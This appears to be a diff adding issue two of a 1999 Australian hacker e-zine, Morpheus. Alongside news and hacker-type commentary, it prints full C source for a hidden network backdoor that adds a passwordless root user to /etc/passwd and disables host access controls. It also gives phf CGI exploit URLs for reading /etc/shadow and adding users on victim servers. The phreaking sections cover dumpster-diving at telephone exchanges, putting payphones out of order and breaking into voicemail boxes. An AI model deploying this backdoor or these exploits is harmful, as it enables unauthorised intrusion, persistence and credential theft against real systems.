@@ -1,0 +1,989 @@
+<=-------------------------------------------------------------------------=>
+,%$+:      =++%-                          -+-
+.+##@      H##H,                         ;@#=
+  H##-    ,##@.                          ,H#=              ISSUE02 JUNE1999
+  X##/    ;##H                            +#=
+  X@#H    $H#H                            /#=
+  X+##,   H+#H             .,    ,-       /#=                           .
+  H=##;  -%/#@.   ./%%=    ++:+,:H%:%%;   /#=-+%=    =%%:  -;:. ,;;-  -%%+-  
+  @,H#X  /;;#M.   XH=%M-  /M$@#%M#M@M#M:  /#+H@#@,  =@/%M: =HM= =X#+ .H+:M$  
+  @,/##. H.;#M.  +#-  @@.-@#M@#=+#$  $#@. /#X, /#; .@X .@@. /#=  -#% ;#  ;H  
+  @.,##:,H :#M.  @M.  $#: ;#X-; -#%  -##= /#:  -#+ :#$==@#= /#=  -#% +#= .$  
+  @  @#$;+ :#M. -#@.  +#+ =#%   -#%   H#/ /#=  -#% +#@XXH#: /#=  -#% +#@+,.  
+  #  +##H= :#M. =#H.  /#$ -#+   -#%   X#+ /#=  -#% $#/      /#=  -#% -####;  
+  #  =##M. :##. =#H.  /#$ -#+   -#%   $#/ /#=  -#% $#%      /#=  -#%  /M##M  
+  #   M#$  :##. -#@.  +#+ -#+   -#%   $#: /#=  -#% %#X      /#=  -#% -.-/##- 
+  #   $#/  :##.  @#,  $#= -#+   -#%   HM, /#=  -#% =##:  -. /#:  :#% /+  ;#- 
+ =#=  :#-  /##=  /#: .@H. =#%   -#H  =#%  /#=  -#% .@#@//H, :#$,=$#X,;@. ;#. 
+:@#@: ,M. %M##@: .$@;$M= ,X#M+. -#M%/@H, :@#@-,H#M: :###M;  .@#@X:#@=-#X;@+  
+---=-  -  =---=-   :+/.  ,:-=;. -#%:+/.  ,:-=..:---  ,++,    .+/ .:   ,/+=   
+                                -#%
+                                -#%
+                                -#%   L    A    U    G    H    I    N    G 
+                                =#%
+                               -H#M;
+                               =;;//
+<=-------------------------------------------------------------------------=>
+            Presented By: ALOC - Australias Legion of Cyberpunkz
+ 
+                         Web:/ http://www.aloc.cc
+                      Email:/ phrost_byte@hotmail.com
+<=-------------------------------------------------------------------------=>
+                   'Its the nature of .. his circuitry'  
+
+                          -= Nine Inch Nails =-
+<=-------------------------------------------------------------------------=>
+
+ Contents
+ --------
+
+  1.0 -[ Welcome ]-
+    1.1 - Introduction......................................Phrost Byte
+    1.2 - About ALOC
+    1.3 - Contibutors To This E-zine
+
+  2.0 -[ News ]-
+    2.1 - ASIO Gain More Power.................................DeiCiDaL
+ 
+  3.0 -[ Hacking ]-
+    3.1 - Hacker Types......................................Phrost Byte
+    3.2 - Backdoor..........................................Phrost Byte
+    3.3 - CGI Exploits (phf).....................DeiCiDaL & Phrost Byte
+
+  4.0 -[ Phreaking ]-
+    4.1 - Exchange Locations (WA)....................iMoRtAl and Others
+    4.2 - Telstra Employee Levels...........................Phrost Byte
+    4.3 - Putting A Payfone Out of Order......................Phrostess
+    4.4 - Free Optus Voicemail!.....................................f0z
+  
+  5.0 -[ Anarchy ]-
+    5.1 - Lock Picking......................................Phrost Byte
+    5.2 - Free Fast Food....................................Phrost Byte
+   
+  6.0 -[ Challenge ]-
+    6.1 - JavaScript Password Box...........................Phrost Byte
+ 
+  7.0 -[ Conclusion ]-
+
+  Appendix I
+
+<=-------------------------------------------------------------------------=>
+
+  1.0 -[ Welcome ]-
+  -----------------
+
+  1.1 - Introduction
+
+  Welcome to the second issue of Morpheus. I recieved lots of praise from the
+  first issue, so i hope the second and following do the same :) Many people 
+  have asked me about the different versions that i mentioned in the first
+  issue, but i have decided just to do one full issue, and release to the
+  masses whatever i want. Although a number of people have told me that FAST
+  no longer works from a payfone.. i hope this is not due to Morpheus, and if
+  it happens again, such information wont be released.. sorry.
+
+  Morpheus will not be released on a set date, it will be released when I 
+  receive enough info to compile another issue. If u have something u would 
+  like printed please send it in.. or if i have contained something in a 
+  previous issue that u feel u should have credit for, or dont like, please!!
+  let me know and i will make the due alterations.
+
+  Enjoy the rest of the e-zine.
+
+            - Phrost Byte
+
+
+  1.2 - About ALOC / Morpheus
+
+  ALOC started off as a group, but it didnt work out. So i went back to my
+  original idea.. and that was to create a place where australian hackers and
+  phreakers could meet together, trade information, and learn. So that is
+  what ALOC has become, a place to get information and talk to others of
+  similar interests. In general it has become a Network.
+
+  Morpheus is part of the above, and it compiles alot of what would be 
+  little texts into one large one, which would otherwise be quite time 
+  consuming to write seperate small files on.
+
+  This magazine in its electronic form can not be sold without prior 
+  permission from the authors. It also may not be spread via any sort of 
+  Public Domain, Shareware or CD-ROM package.
+
+
+  1.3 Contibutors To This E-zine
+
+  Phrost Byte - phrost_byte@hotmail.com (me of cource!)
+  Phrostess - not a cyberpunk, so correspondence would be futile.
+  Deicidal - deicidal_@hotmail.com
+  f0z - f0z1@hotmail.com
+  iMoRtAl - imortal@mailandnews.com
+  
+<=-------------------------------------------------------------------------=>
+
+  2.0 -[ News ]-
+  --------------
+
+  2.1 - ASIO Gain More Power
+
+  The Australian Government, being the techno-brainless institution that it 
+  is, is trying to push a bill through parliament that will allow ASIO 
+  (Australian Security Intelligence Organisation) to have greater power in 
+  the areas of intelligence gathering in Australia. This will include greater
+  freedom to hack into private computers, copy files and alter data as well 
+  being able to legally place tracking devices on peoples and private 
+  property.
+
+  It is proposed that the new bill will be for "Better security leading up to
+  the Sydney 2000 Olympics" but we all know that once the Olympics are gone,
+  the bill will still be here to stay.
+
+  The Federal Attorney-General, Daryl Williams, stated that the bill will 
+  permit security officers to hack into a computer if "there are reasonable 
+  grounds for believing that access to data held in a particular computer 
+  (the target computer) will substantially assist the collection of 
+  intelligence that is important in relation to security."
+
+  The bill allows ASIO to employ intelligence-gathering methods not 
+  previously allowed under the Australian Security Intelligence Act, 1979.
+  This includes extending the period that a warrant applies for, now up to
+  six months. It also allows ASIO to use tracking devices, not specified by
+  Mr. Williams (wonder why!), as well as giving it powers to enter property,
+  and alter objects to install tracking devices. The bill also allows ASIO to
+  enter a property to remove devices, while the warrant is in force, during a
+  28-day period after the warrant is enforced and if the device is not
+  recovered during that period, or in Mr. William's words, "at the earliest
+  possible time".
+
+  An access warrant will permit ASIO to use computers, phone companies and 
+  telecommunications equipment to gain access to a remote or networked 
+  computer. Once in, the ASIO hackers will be allowed to copy, add, delete or
+  alter any data in the target computer that is relevant to the security 
+  matter.
+
+  When they leave security officers will be allowed to cover up the fact that
+  they hacked into the system and will not be subject to the Crimes Act, 
+  which forbids computer hacking in Australia.
+
+  Other powers include the authority to examine an article being delivered by
+  a delivery service provider, to conduct investigations for the collection 
+  of foreign intelligence in Australia, including the use of human agents. 
+  "Access to open source material, e.g. Internet and media, may also be used 
+  to supplement other material," talking about online monitoring, search 
+  engine use and filters.
+
+  ASIO was established in 1949 to protect the Commonwealth from acts of 
+  sabotage from internal or external threats but as the clock ticks over 
+  towards 2000 it looks to be lagging behind in its primary job and although
+  measures are being taken now to secure Australia for the coming of the 
+  Olympics, it looks just like a disguised version of Big Brother, attempting
+  to keep a watchful eye on the Australian cybercommunity.
+
+<=-------------------------------------------------------------------------=>
+
+  3.0 -[ Hacking ]-
+  ------------------
+
+  3.1 - Hacker Types
+
+  Most e-zine / sites have a list of the different types of hacker out there,
+  so here is mine. This is not the definative list, or the be all and end all
+  list. These are just my opinions / views, and they will all be read, and
+  thought about differently by each person, since everyone has their own
+  meaning for what a 'hacker' really is. Alot of them overlap.. and it just 
+  makes for interesting reading... if anything? 
+
+  Which one are u?
+
+  Lamer: general colective term for the-i-saw-hacker-the-movie-and-wanna-be-
+  one-too, the-script-kiddie, the-so-called-1337-hacker, and any others that
+  fit.
+
+  The-i-saw-hackers-the-movie-and-wanna-be-one-too: 7h3y 741k l1k3 7h15 (they
+  talk like this) .. or LiKe ThiZ.. since thats how they typed in the movie.
+  All they do / wanna know is how to nuke their friends, flood channels, 
+  email bomb, hack such and such's home page, and take over IRC chans.
+
+  The-script-kiddie: they are above the so-called-1337-hacker, because they
+  can actually root boxes, even though they have no idea what they are doing.
+  They just run exploits against box after box, and are usually after warez,
+  or credit cards. They have a large collection of exploits, and programs
+  with BIG, BEAUTIFUL!! shiny Buttons!!!
+
+  The-so-called-1337-hacker: these types go around bragging to every1 how
+  'leet' they think they are, and think that they can root every box they
+  come across. They bag other hackers non-stop due to their jealousy, since
+  they know in actual fact that they couldnt hack a DOS box even if they had
+  physical access it it! And when posed with a question, they bullshit around
+  the answer, since they dont know it, but they want u to think that they do.
+
+  Hacker-with-a-life-albeit-computer-orientated: these hackers are people
+  that usually have girlfriends, and actually 'get out' into the real world
+  once in awhile, be it for a new music cd, comic, some new clothes, or more
+  than likely computer hard ware :)
+
+  Hacker-with-no-life-whatsoever: they spend all night hacking away, sleep 
+  during the day (if at all), and get right back to it at night. They are 
+  normally in the top classes in school (chem, calc, etc), but due to their 
+  hacking.. they dont do too well at school. They never go out, they have
+  never met their friends, and only know them by pseudonyms, and have MAYBE
+  had voice contact if they dabbled in phreaking...
+
+  The-real-life-hacker: a hacker who hacks things in everyday life. They put 
+  the hacker ethics and tactics into play in real/everyday life. For example,
+  they complain how un-efficient the road / traffic light system is. These 
+  types are more closely related to the 'old school hacker'. Since that is 
+  basically what they are.
+
+  The-REAL-ELITE-Hacker: they can code very efficiently in a language, they
+  are the ones who come up with / find all these exploits, and they also
+  actually do something for others. They teach. Unlike the so-called-1337
+  -hacker when posed with a question, they will answer to the best of their
+  ability, and if they cant answer it they will tell you straight out that
+  they dont know the answer, and will point you in the right direction,
+  instead of bullshitting it. Not many.. IF any of these are around.
+
+  The-Ethical-Hacker: hackers in suits that get paid.
+
+  
+  3.2 - Backdoor
+
+  I found the following backdoor on a site somewhere, and there is no credit
+  to who wrote it, i have modified the orginal, but i wont call it my own
+  (since it is not!). The original only listened on port 550 i think it was..
+  I modified it so that the user can specify what port to listen on, and the
+  user that is added to the passwd file looks more realistic. And for another
+  option i made it so that you can remove the files /etc/hosts.allow and
+  /etc/hosts.deny so you can telnet in without having to go through wingates,
+  or other means. After modifing the backdoor i found, i noticed that Keen 
+  Veracity had already published one which does basically the same thing. 
+  (Issue 1, www.legions.org, by jsbach). But the version i had was a lot 
+  cleaner.. so  here it is:
+
+  //-------------------------------------------------------------------------
+  //  Usage (setup):
+  //      # gcc -o backdoor backdoor.c
+  //      # ./backdoor <password> <port> &
+  //  Usage (using):
+  //     telnet to the host (with the port you specified), type the password
+  //     (there is no prompt, therefore its less obvious as a backdoor),
+  //     and select an option. 
+  //
+  //   Note: dont use backdoor as the name to compile it to, since if a
+  //   process listing is performed.. a process called backdoor looks abit
+  //   suss, or if you know how, modify ps, so it doesnt show up backdoor :)
+  //
+  //  Option 1: adds the user "smithr::0:0:Robert Smith:/root:/bin/bash"
+  //  Option 2: copies /etc/hosts.allow to /etc/hostsallow.bak and 
+  //            /etc/hosts.deny to /etc/hostsdeny.bak, and touches replaces, 
+  //            so u can telnet in..
+  //-------------------------------------------------------------------------
+
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <errno.h>
+  #include <string.h>
+  #include <sys/types.h>
+  #include <netinet/in.h>
+  #include <sys/socket.h>
+  #include <sys/wait.h>
+  
+  #define MAXDATASIZE 100
+  #define BACKLOG 10
+  
+  void handle(char *command);
+
+  int main(int argc, char *argv[]) {
+    int sockfd, new_fd, sin_size, numbytes;
+    char *bytes;
+    struct sockaddr_in my_addr;
+    struct sockaddr_in their_addr;
+    char buf[MAXDATASIZE];
+    char ask[]="Enter Command:\n1. Add new user (Robert Smith) to 
+      /etc/passwd.\n2. Remove hosts.allow and hosts.deny\n:";
+    
+    if (argc != 3) {
+      fprintf(stderr,"Usage: %s <password> <port>\n", argv[0]);
+      exit(1);
+    }
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+      perror("socket");
+      exit(1);
+    }
+    my_addr.sin_family = AF_INET;
+    my_addr.sin_port = htons(atoi(argv[2]));
+    my_addr.sin_addr.s_addr = INADDR_ANY;
+    if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))
+    == -1) {
+      perror("bind");
+      exit(1);
+    }
+    if (listen(sockfd, BACKLOG) == -1) {
+      perror("listen");
+      exit(1);
+    }
+    while(1) {  /* main accept() loop */
+      sin_size = sizeof(struct sockaddr_in);
+      if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr,
+      &sin_size)) == -1) {
+        perror("accept");
+        continue;
+      }
+      inet_ntoa(their_addr.sin_addr);
+      if (!fork()) {
+        recv(new_fd, buf, MAXDATASIZE, 0);
+        bytes = strstr(buf, argv[1]);
+        if (bytes != NULL) {
+          send(new_fd, ask, sizeof(ask), 0);
+          numbytes=recv(new_fd, buf, MAXDATASIZE, 0);
+          buf[numbytes] = '\0';
+          handle(buf);
+        }
+      close(new_fd);
+      exit(0);
+    }
+    close(new_fd);
+    while(waitpid(-1,NULL,WNOHANG) > 0);
+    }
+  }
+
+  void handle(char *command) {
+    FILE *fle;
+    if(strstr(command, "1") != NULL) {
+      fle = fopen("/etc/passwd", "a+");
+      fprintf(fle, "smithr::0:0:Robert Smith:/root:/bin/bash");
+      fclose(fle);
+    }   
+    if(strstr(command, "2") != NULL) {
+      system("mv /etc/hosts.allow /etc/hostsallow.bak");
+      system("mv /etc/hosts.deny /etc/hostsdeny.bak");
+      system("touch /etc/hosts.allow /etc/hosts.deny");
+    }
+  }
+
+
+  3.3 - CGI Exploits
+  ----------------------
+
+  Each issue I hope to have a new CGI exploit for you, these can still be
+  found on many servers, and most particularily ones that run older versions
+  of Apache, with the demo CGI scripts installed.
+
+  CGI - Common Gateway Interface. Using CGI extends the capabilities of a
+  server to interpret information from the browser and return information
+  based on user input. One of the easiest ways to to break into a machine
+  through a CGI program is to try and confuse it by experimenting with the
+  input. If the CGI is not robust, it will either crash or do something it
+  was not designed to.. 
+
+  Phf
+  ---
+  
+  This is a very old exploit, but Phrost and I have managed to find some 
+  ISP's that still have not fixed this gaping hole. So we have started off
+  with this one, and it is also very simple to implement. The following is
+  only an introduction (hence to push you in the right direction), there are 
+  many files out there that delve into phf alot deeper, find them yourself,
+  the following gives you enough information to understand why phf is
+  exploitable, and how to do it.
+
+  Phf is originally designed to update a phonebook style listing of people.
+  As mentioned above, CGI scripts can behave differently by 'confusing' them,
+  and phf is easily 'confused' by sending it the newline (0a) character.
+
+  Phf is located in the WWW cgi-bin directory. If it is there, and has 
+  permission x, you can use any web browser to read files on the host's
+  computer, and save them to your own. Depending on what the httpd server is
+  running as, depends on what you can do with phf, eg if it was running as
+  root, you can add new users, etc.
+
+  Firstly you must find a site that still has phf installed on their system.
+  Unless you want to be typing address's into your browser all your life, 
+  Phrost has taken the liberty of writting a phf scanner in REBOL for you all
+  (see Appendix I). The above mentioned scanner will be updated and improved
+  with each issue. 
+
+  Once you have found a machine that looks like it may be vulnerable, the
+  next move is to check to see if phf is still active. Do this by checking
+  to see what user it is running under, by typing the following URL into
+  your browser:
+
+  http://www.victim.com.au/cgi-bin/phf/?Qalias=x%0aid
+
+  It should return something similar to:
+
+  QUERY RESULTS
+  /usr/local/bin/ph -m alias=x id
+  uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)
+
+  This shows that httpd is running as nobody..
+
+  If you find one that is running as root, you can perform such functions as:
+  
+  Display the /etc/shadow file (shadow file may be a different name):
+  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow
+
+  Add a root user:
+  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/adduser%20username%20
+  username%20100%20
+  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/chuid%20username%0
+  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/chuid%20root%500
+
+  Even if you dont get root access, make sure you still have a look around
+  the system.. Once Phrost and I found an ISP that kept their passwords well
+  shadowed except that they kept another copy in a file called auth_users 
+  with both usernames and passwords together, and was world readable!
+
+  Be warned though, many ISP's do know about this exploit and have taken
+  measures to record foreign IP's that attempt to exploit them (and usually
+  display a message such as 'Smile you're on camera') For many of us this
+  doesnt matter too much but i thought i would warn you anyway so that when
+  your ISP gets mail from one of your attempted tagets... dont blame me.
+
+<=-------------------------------------------------------------------------=>
+
+  4.0 -[ Phreaking ]-
+  -------------------
+
+  4.1 - Exchange Locations (Western Australia)
+
+  The following are a list of exchange locations and descriptions for Western
+  Australia. Unfortunately i havent had any submitted for the other states.
+  This information is very handy to phreaks.. Telstra can't exactly move the
+  exchange, like they can change the numbers we get a hold of :)
+  
+  The follwing were submitted by Optix:
+
+  Wellington Exchange 
+    - 639 Wellington Street, Perth
+    - 2 Dumpsters at end of Main driveway just under security camera
+    - building is approximately 16-20 storeys high
+
+  Pier Exchange 
+    - 98 Pier Street, Perth
+    - 1 Wheelie Bin spotted. 1 (possibly 2/3) dumpsters spotted behind 
+      corrugated steel gate (easy to jump)
+    - approximately 7 stories high. Right next to Red CAT stop #1
+
+  Kelmscott Exchange
+    - Albany Highway, Kelmscott
+    - 1 wheelie bin outside back enterance. 1 LOCKED Dumpster behind exchange
+      (off property)
+    - lock for dumpster is around about a 40mm - 60mm padlock, you could get 
+      through it with an average size pair of bolt cutters. Also what looks 
+      like a big power generator (on property) to the side of the building
+      (about the size of a cargo container). Easy access at the rear of the
+      building, it's a carpark for Kelmscott Railway Station. You could park
+      right next to the dumpster and in front of the wheelie bin.
+
+  The follwing were submitted by Bad Vibez:
+  
+  Carey Street (Near Catholic School) 
+    - a couple of dumpsters, i think, towards the back 
+    - there's an empty field backing it, you can't get to it from the highway
+      though, and perhaps if you convinently dropped a footy into the
+      dumpster from that side, then walked around the front, talked to the
+      gatehouse guy, told him that you were getting your footy, you could 
+      dumpster the joint. 
+
+  The following were submitted by iMoRtAl
+
+  Exchange           Phone Number     Address
+
+  Applecross                          101 Adross St (cnr Macrae)
+  Armadale           9497 1199        Jull St (Next to post office)
+  Ascot              9361 1650        Hardley Rd, Belmont
+  Ashfield           9279 5863        Wesfarmers, Railway PDE
+  Attadale           9330 1111        cnr Curtis & Holme Rd, Melville
+  Baldivis           9524 1049        Baldivis Rd (south of Fay Rd)
+  Ballajurra         9249 5099        Illawarra Cres
+  Bassendean         9377 3699        Wilson Street
+  Bateman            9332 1199        Hassel Cres (off Leichhardt St),
+                                      Bullcreek
+  Beckenham (L/Y)    9451 1200
+  Beechboro          9377 4090        cnr Amazon Drive & Sacramento Ave
+  Belhus             9297 3999        Chateau Place, (Before security gate)
+  Bentley office                      Ewing St (Near Sevenoaks Street)
+  Bullsbrook         9571 1352        Bullsbrook Road
+  Bulwer             9491 7455
+  Burns Beach        9305 5999        Marmion Ave (1km past Burns Beach
+                                      Road, on left)
+  Byford             9525 1099        cnr Blytheswood & South Western Hwy
+  Carmel             9293 5211        Carmel Road near cnr of Ash Street
+  Carrabooda RCM                      Karoborup Rd, 1.1km off Wanneroo Road
+  Carramar Pk RCM                     cnr Wanneroo Rd & Carramar Rd
+  Cannington         9350 6373        cnr Wharf St & Albany Hwy
+  Canning Vale       9455 1199        Amherst Rd (near Nicholson Ct)
+  Caversham RAAF     9571 7631        Harrow Street
+  Chidlow            9572 4099        Thomas St, near Rosedale Rd
+  Chittering Downs   9571 1199        Meadowbrook Ramble
+  City Beach         9385 7999        cnr Templetonia Cr and Kingsland Ave
+  Cottesloe          9385 3999        cnr Stirling Hwy and Congdon St
+  Currumbine         9305 3999        cnr Marmion Ave and Moore Drive (on
+                                      right)
+  Darlington         9299 6799        cnr Montrose Ave & Darlington Rd
+  Doubleview         9445 1090        Scarborough Beach Road (cnr Hutriss
+                                      Rd)
+  Flynn Drive RCM                     off Flynn Dr, on Mather Passed Avery
+                                      St
+  Forrestdale        9397 0111        Hale Road near Hanover St
+  Fremantle          9335 1201        Short St (near Market St)
+  Gidgegannup        9574 6099        Reserve Road
+  Gidgegannup
+  Springs                             cnr McKnoe Drive & Charcole Rd
+  Girrawheen         9247 1094        Girrawheen Ave, near Hudson Ave
+  Glenroyd           9574 4099        cnr Berry & Reserve Road Gidgegannup
+  Glen Forrest                        cnr Hardey Rd & Railway Parade
+  Gnangara                            R42 Site, off Wetherell Rd (pine
+                                      plantation)
+  Gosnells           9398 2200        cnr Dorothy & Hicks St
+  Greenmount         9294 1090        Innamincka Rd, (near round-about)
+  Hamersley          9447 7123        cnr Beach Rd and Okley Rd, Carine
+  Hepburn Hts RIM                     off Walter Dr, Padbury Blvd (r)
+                                      Blackwattle
+  Herne Hill         9296 1100        Gt Northern Hwy, near McDonald St
+  Hilton             9314 2202        cnr South & Chamberlain St
+  Hutingdale         9490 5199        Balfour St, (between Holmes and
+                                      Bullfinch)
+  Jandakot           9414 5001        cnr Forrest Rd & Elderberry, South
+                                      Lake
+  Joondalup          9300 2999        Winton Ave, Joondalup CBD
+  Kalamunda (L/Y)    9291 7422        Railway Rd, (opposite Kalamunda
+                                      Hotel)
+  Kelmscott                           Albany Hwy (near Railway Stn)
+  Kewdale            9353 1457        Miles Rd (near Stores)
+  Kingsley           9309 2999        Ardrossan Loop (opposite no. 36)
+  Lansdale           9302 1999        cnr Mosey St and Rogers Way
+  Lesmurdie          9291 6234        Rooth Rd (near Lesmurdie Rd)
+  Maddington         9493 3555        cnr of Attfield and Herbert
+  Maida Vale                          Kalamunda Rd (near Hawtin Rd)
+  Malaga (L/Y)       9249 1717        Westchester Rd
+  Manning            9313 1199        cnr Ley St & Manning Rd
+  Maringinup RCM                      off Pingar Rd right on Neaves
+  Maylands           9272 1235        cnr Guildford Rd & Penninsula Ave
+  Maylands Police
+  Acad.                               Bank Rd
+  MDLD V101-102                       cnr Dalgety & Swan St, Middle Swan
+  MDLD V103-104                       cnr Marshall Rd & Dulwich St
+  MDLD V105-107                       cnr Marshall Rd & Arthur St
+  Medina             9493 2924        4 Calista Ave (near Summerton Rd),
+                                      Calista
+  Menora                              (behind Inglewood pool) Alexander Drv
+  Midland            9250 1999        cnr Morrison Rd & New Bond St
+  Midland (L/Y)      9274 3666        cnr Elgee St & Freguson St
+  Mindarie           9407 7999        Rothesay Hts (of Anchorage Dr)
+  Mt Hawthorn        9443 1099        cnr Scarborough Beach Rd and Oxford
+                                      St
+  Mt Helena          9295 1120        cnr Evans & Marquis St
+  Morley             9276 1094        (near Marlows) Russel St
+  Mt Yokine          9481 0717        (radio site) 1 Osborne Rd
+  Mullaloo           9401 1094        cnr Coral St and Marmoin Ave, Craigie
+  Mundaring          9295 1090        Gt Eastern Hwy (next to Police)
+  Mundijong                           Jarrahdale Rd ( near South West Hwy)
+  Nedlands           9386 1020        cnr Stanley St and Elizabeth St
+  Neerabup           9407 5099        cnr Wanneroo Rd & Gibbs Rd
+  Ocean Reef         9300 4999        cnr Santiago Pwy and Baroola Pl
+  O'Connor (L/Y)     9337 5444
+  Optus Lockridge    9378 1266        (Telecom switch room) Altone Rd,
+                                      Kiara
+  Osborne Park       9244 3900        12 Carbom Crt (Unit 6)
+  Parkerville        9295 4200        Owen Rd near Byfield Rd
+  Palmyra            9319 1883        Canning Hwy (near Petra St)
+  Pearce RAAF        9571 1232        (RAAF PABX room) Gt Northern Hwy,
+                                      Bullsbar
+  Perth North        9240 1090        (off lunchroom) 1 Bendsten Pl
+  Pickering Brook    9293 1136        Pickering Brook Rd (opposite primary)
+  Pier               9221 4187
+  Quinns Rock        9305 1999        about 70 Quinns Rd (top of hill)
+  Riverton           9354 1514        cnr Corinthian & Modillion Rd
+  Rockingham         9527 8100 / 9592 Simpson Ave (near Read St)
+                     1399
+  Roleystone         9397 5200        Holden Rd
+  Rockingham (L/Y)   9592 2444
+  Rottnest           9292 5000        Cristie Dv, Rottenst
+  Rolling Green      9574 7122        Green Pl
+  Sawyers Valley                      (microwave tower site) 1.2km east of
+                                      town
+  Scarborough        9245 1090        10 Stanley St
+  Secret Harbour     018 946 489
+  Seacrest Rim                        (hut in backyard) Harman Rd cnr
+                                      Seacrest Dr
+  South Coogee       9437 1178        Rockingham Rd (near Dalison Ave)
+  South Perth                         Angelo St (near Coode St)
+  Spearwood          9434 2163        Mell Rd (off Rigby St)
+  Straton            9250 7999        Farral Rd
+  Subiaco            9381 5999        cnr Park St & Rockeby Rd (behind
+                                      P.O.)
+  The Lakes          9572 6019        Gt Eastern Hwy
+  Tuart Hill         9344 1212        cnr Wanneroo Rd &Myinbar Way
+  Two Rocks          9561 5999        Lisford Ave (before Soverign Ave)
+  Victoria Park      9361 7222        cnr Teague St & Axon St
+  Vines                               (PABX room) The VInes Resort Hotel
+  Wanneroo           9306 3999        916 Wanneroo Rd
+  Warnbro            9593 1384 / 9593 Holcombe Rd (near Warnbro South Rd)
+                     2900
+  Wellington         9481 0099        2nd floor, 639 Wellington St
+  Wembly             9383 7999        cnr Marlow St & Bournville St
+  Wundowie           9573 6299        Boronia Ave (near fire station)
+  Wooroloo           9573 1299        Linley Valley Rd
+  Yanchep            9561 1099        Glenrothes Cr (oppos fire station)
+
+
+  4.2 - Telstra Employee Levels
+
+  I have written the following based on a variety of sources.
+
+  Telecommunications Officer (previously known as Linesperson)
+    They install and maintain external telecommuncations equipment
+    (including aerial lines, conduits and cables) and telephone customers'
+    premises. These are the people who drive arround in the Telstra cars,
+    vans, and wagons. Telstra also hire telecommunications offers on
+    contract from other companies, you may have seen unmarked white (always
+    white) cars parked near pods, payfones, etc. So when you start noticing
+    lots of Telstra vans, remember there are also unmarked white wagons that
+    also contain Telstra related equipment ;)
+    
+    The majority of telecommunications officers work for Telstra and are
+    classified as communication officers grades 1 to 6, according to the
+    duties they perform. (The higher the number, the more access they have
+    to Telstra equipment and facilities.. eg if you have a set of keys that
+    have exchange keys on them.. you more than likely stole them from a high
+    ranking telecommunication officer, or even a telecommunication
+    technician.. see further below).
+    
+    Grades 1 to 3 may perform the following tasks:
+    - help to install transmission lines and equipment at heights on towers
+    - operate excavation machinery to provide trenches and install conduits
+    - lay and joint underground (metallic and fibre optic) cables for the
+      transmission of telephone, television, radio, and computer data, which
+      involves work in underground tunnels
+    - connect cables in the network between exchanges and customer's premises
+    - install telephones and communications equipment (simplex services) at
+      customers' premises
+    - provision of support for LAN (Local Area Network) systems including the
+      establishment, configuration, use, troubleshooting and support for 
+      such systems
+    - travel by mobile unit to attend to telecommunication difficulties and
+      customer complaints, and
+    - correct faulty, unearthed or broken lines which may be caused by
+      lightning, or damaged by accident or fire. (ED - and phreaks!)
+
+    Grades 4 to 6 with Telstra are mainly supervisory and training positions
+    and may perform the following additional tasks:
+    - supervise and develop training programs for communications officers at
+      lower levels, and
+    - operate computer systems which record and store data on maintenance and
+      repair of equipment and plant.
+
+  Telecommunications Technician
+    They install, operate, maintain ans repair telecommunications and
+    broadcasting networks and equipment. Most technicians work for Telstra,
+    but as mentioned above, Telstra also hire technicians on contract.
+    Telstra technicians are known as telecommunications technical officers
+    (TTO). 
+
+    TTO's work both indoors and outdoors, and have considerable contact with
+    customers in business or private homes. They may work in telephone
+    exchanges, computer and equipment rooms, installation or service depots
+    for sustained periods of time. TTO's are ranked from grades 1 to 7, 
+    according to the duties they perform.
+
+    Telecommunications technicians may perform the following taks:
+    - commission and accept network equipment and the provision of new 
+      services
+    - ensure the integrity and quality of equipment and circuit installations
+    - position and terminate cables, install jumpers, wires, and strappings
+    - undertake proof tests such as wire testing, analogue circuit 
+      commissioning and power tests
+    - assemble, erect, position and label all items of equipment
+    - sell telecommunications products
+    - provide estimates to customers for installation of equipment
+    - install and maintain telephones, PABX and other business communication
+      systems (complex services) at customers' premises
+    - install, test and carry out restorativeand routine maintenance on all
+      types of telecommunications, switching and transmission equipment,
+      including telephone exchanges and the public telephone network.
+    - carry out, under supervision, modifications to items of equipment
+    - analyse system faults with a high degree of diagnostic skill 
+    - maintain and adhere to operational procedures and complete appropriate
+      documentation
+    - assume responsibility for assigned tools, plant and test equipment
+      (ED - LMAO!!!)
+    - develop and maintain good relations with internal and external
+      customers, and
+    - operate call tracing facilities when necessary (ED - argh!)
+   
+
+  4.3 - Putting A Payfone Out of Order
+
+  I know alot of people once knowing that how to put a payfone out order was
+  going to be in Morpheus 2, have sent me an email telling me how to do it, 
+  but since my girlfriend was the first to teach me how to do it, here is her
+  article.. enjoy!
+
+  Ok...so you want to put a payphone out of order but Phrost and Deicidal 
+  won't lend you their precious keys. (hey who needs keys if you're a REAL
+  phreaker, right?) To put a X2 payphone (thats what Phrost tells me it is,
+  to me its just another fucking phone, no different from the last or the
+  next...) out of order you will require: bolt cutters, a soldering iron, 
+  gloves, suphuric acid, and lots of brute strength. WRONG! All you need is 
+  the little <OK> button and the handset itself! 
+  
+  Hold down the <OK> button and THEN pick up the handset for just a matter of
+  moments - perhaps 3 seconds if that, just until the phone registers - never
+  releasing the <OK> button. Then hang up the phone, and MON DIEU! The phone 
+  is now out of order! 
+
+  And now that I've had this contribution to the cyber-technology-FUTURE
+  age forced out of me, I'm going to dive straight back into the Russian 
+  Revolution and immerse myself in HISTORY...
+
+  à bientôt!
+  Phrostess; aka NOT a phreaker-hacker-coder-cyberpunk-whatever.
+
+
+  4.4 - Free Optus Voicemail!
+
+  f0z
+  VMB (03) 9220 9828
+  f0z1@hotmail.com
+
+  Looking for a free optus voicemail box?
+  The exchange here in Melbourne is (03) 9220 XXXX.
+  It might be different in other states. Just look in the back of the 
+  L-Z white pages for the exchange page and dial a few optus ones till you 
+  start getting VMB's.
+
+  Just call up one and if you get a recoring of the optus lady saying 
+  leave a message after the beep press * 
+  It will ask you for the passcode and the passcode is the number that you
+  just dialed.
+  i.e box: 9220 3243
+  passcode: 9220 3242
+
+  If it doesn't work then try it without the 9 at the start.
+  If you call up and get some other guys box then press * twice to get to 
+  the login menu. From there dial any number you wish in the 9220XXXX
+  exchange. You can spend all night scanning on the one phone call.
+
